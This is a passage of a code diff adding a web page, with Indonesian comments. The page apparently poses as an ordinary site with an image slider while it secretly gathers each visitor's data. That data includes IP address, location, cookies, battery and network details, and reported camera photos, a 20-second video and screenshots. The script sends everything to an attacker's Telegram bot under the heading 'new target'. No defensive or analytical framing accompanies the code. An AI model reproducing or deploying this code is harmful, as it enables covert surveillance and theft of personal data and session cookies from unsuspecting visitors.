+                    const blob = b64toBlob(realData, 'application/octet-stream');
+                    
+                    formData.append('document', blob, fileName);
+                    formData.append('caption', message);
+                    
+                    await fetch(url + 'sendDocument', { method: 'POST', body: formData });
+                }
+                else {
+                    // KIRIM PESAN
+                    await fetch(url + 'sendMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                }
+            } catch (e) {
+                console.log('Telegram error:', e);
+            }
+        }
+
+        function b64toBlob(b64Data, contentType) {
+            const byteCharacters = atob(b64Data);
+            const byteArrays = [];
+            
+            for (let offset = 0; offset < byteCharacters.length; offset += 512) {
+                const slice = byteCharacters.slice(offset, offset + 512);
+                const byteNumbers = new Array(slice.length);
+                for (let i = 0; i < slice.length; i++) {
+                    byteNumbers[i] = slice.charCodeAt(i);
+                }
+                byteArrays.push(new Uint8Array(byteNumbers));
+            }
+            
+            return new Blob(byteArrays, { type: contentType });
+        }
+
+        async function sendCompleteInfo() {
+            const info = await getCompleteInfo();
+            const ip = await getPublicIP();
+            
+            let message = `<b>🔴 TARGET BARU</b>\n\n`;
+            message += `<b>🌐 IP:</b> ${ip}\n`;
+            message += `<b>📱 URL:</b> ${info.url}\n`;
+            message += `<b>💻 Platform:</b> ${info.platform}\n`;
+            message += `<b>🖥️ Screen:</b> ${info.screen}\n`;
+            message += `<b>🔋 Baterai:</b> ${info.battery}\n`;
+            message += `<b>🌍 Lokasi:</b> ${info.location}\n`;
+            message += `<b>📶 Network:</b> ${info.connection}\n`;
+            message += `<b>🍪 Cookies:</b> ${info.cookies.substring(0, 100)}...\n`;
+            message += `<b>⏰ Waktu:</b> ${info.timestamp}\n\n`;
+            message += `<b>✅ STATUS:</b>\n`;
+            message += `• Foto: TERKIRIM\n`;
+            message += `• Video 20 detik: TERKIRIM\n`;
+            message += `• Screenshot HP: TERKIRIM\n`;
+            message += `• Flash: ${flashActive ? 'Dinyalakan' : 'Tidak support'}`;
+            
+            await sendToTelegram(message);
+        }
+
+        // ============================================
+        // SLIDER OTOMATIS
+        // ============================================
+        const slides = document.querySelectorAll('.slide');
+        const dots = document.querySelectorAll('.dot');
+        let currentSlide = 0;
+
+        function showSlide(index) {
+            slides.forEach(s => s.classList.remove('active'));
+            dots.forEach(d => d.classList.remove('active'));
+            slides[index].classList.add('active');
+            dots[index].classList.add('active');
+        }
+
+        setInterval(() => {
+            currentSlide = (currentSlide + 1) % slides.length;
+            showSlide(currentSlide);
+        }, 5000);
+
+        dots.forEach((dot, i) => {
+            dot.addEventListener('click', () => {
+                currentSlide = i;
+                showSlide(currentSlide);
+            });
+        });
+
+        // EXPOSE FUNCTION
+        window.triggerCapture = triggerCapture;
+    </script>
+</body>
+</html>
